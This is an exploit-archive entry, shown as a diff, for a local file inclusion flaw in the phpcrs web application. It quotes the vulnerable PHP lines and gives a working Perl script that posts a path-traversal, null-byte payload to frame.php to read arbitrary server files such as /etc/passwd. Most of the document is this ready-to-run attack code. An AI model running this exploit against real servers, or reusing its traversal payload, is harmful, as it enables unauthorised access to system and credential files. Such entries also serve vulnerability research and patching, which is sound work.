@@ -1,0 +1,83 @@
+id: 14010
+date: 09/07/2010
+title: phpcrs <= 3.Za / Local File Inclusion Vulnerability
+author: Pepelux
+cves: 
+
+===================================================
+phpcrs <= 3.Za / Local File Inclusion Vulnerability
+===================================================
+
+# Author: Pepelux <pepelux[at]enye-sec.org>
+# Software Link: http://sourceforge.net/projects/phpcrs/
+# Version: <= 3-Za - Release Date: 2010-01-02
+# Category:: webapps
+# Google dork:
+# Tested on: windows & linux Debian
+
+#! /usr/bin/perl
+# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+# phpcrs <= 3.Za / Local File Inclusion Vulnerability
+# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+# 
+# $ Program: phpcrs
+# $ Version: <= 3-Za
+# $ Release Date: 2010-01-02 
+# $ File affected: frame.php
+# $ Download: http://sourceforge.net/projects/phpcrs/
+# 
+# 
+# Found by Pepelux <pepelux[at]enye-sec.org>
+# eNYe-Sec - www.enye-sec.org
+# 
+# 
+# --Bug --
+# 
+# 123.     elseif( isset($_POST['btnStartImport']) ) {
+# 124.       require("../inc/selectSupplierImport.inc.php");
+# 125.       $importFunction = $_POST['importFunction'];
+# 126.       require("../inc/". $importFunction .".inc.php");
+# 127.       $importFunction();
+# 
+# 
+# In previous version you can exploit LFI by GET. On this version it checks that you use POST request, but
+# with a little script is possible to exploit again.
+ 
+use LWP::UserAgent;
+use HTTP::Request::Common;
+ 
+my ($host, $file) = @ARGV ;
+ 
+unless($ARGV[1]){
+    print "\nUsage: perl $0 <host> <file_to_edit>\n";
+    print "\tex: perl $0 http://localhost /etc/passwd\n\n";
+    exit 1;
+}
+ 
+$host = 'http://'.$host if ($host !~ /^http:/);
+$host .= "/" if ($host !~ /\/\$/);
+ 
+my $ua = LWP::UserAgent->new();
+$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1");
+$ua->timeout(10);
+ 
+my $request = HTTP::Request->new();
+my $response;
+my $url = $host."index.php";
+ 
+my $req = HTTP::Request->new(POST => $host."frame.php");
+$req->content_type('application/x-www-form-urlencoded');
+$req->content("command=btnStartImport=xxx&importFunction=../../../../../".$file."%00");
+ 
+$request = $ua->request($req);
+$result = $request->content;
+ 
+$result =~ s/<[^>]*>//g;
+ 
+print $result . "\n";
+ 
+exit;
+
+
+
+#  0day.today [2023-03-22]  #
